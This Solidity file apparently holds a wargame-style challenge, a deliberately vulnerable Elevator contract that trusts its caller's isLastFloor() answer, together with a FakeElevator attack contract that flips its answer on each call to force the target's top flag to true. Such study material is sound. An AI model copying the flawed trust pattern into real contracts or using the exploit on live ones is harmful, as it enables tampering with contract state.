// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract FakeElevator {
    bool public toggle = true;
    Elevator public elev;

    constructor(address _target) {
        elev = Elevator(_target);
    }

    function isLastFloor(uint256) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop(uint256 _floor) public {
        elev.goTo(_floor);
    }
}
